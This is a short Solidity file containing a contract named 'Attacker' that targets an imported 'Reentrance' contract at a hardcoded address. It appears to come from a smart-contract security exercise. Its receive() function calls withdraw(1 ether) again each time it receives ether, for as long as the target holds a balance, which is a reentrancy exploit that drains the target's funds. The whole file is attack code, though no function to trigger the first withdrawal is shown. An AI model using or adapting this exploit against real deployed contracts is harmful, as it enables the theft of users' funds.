// SPDX License Identifier: MIT

pragma solidity ^0.8.13;

import {Reentrance} from "./Reentrance.sol";

contract Attacker {

    address payable constant reentranceContractAddress = payable(0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f);

    receive() external payable {
        if((reentranceContractAddress).balance > 0) {
            Reentrance(reentranceContractAddress).withdraw(1 ether);
        }
    }

}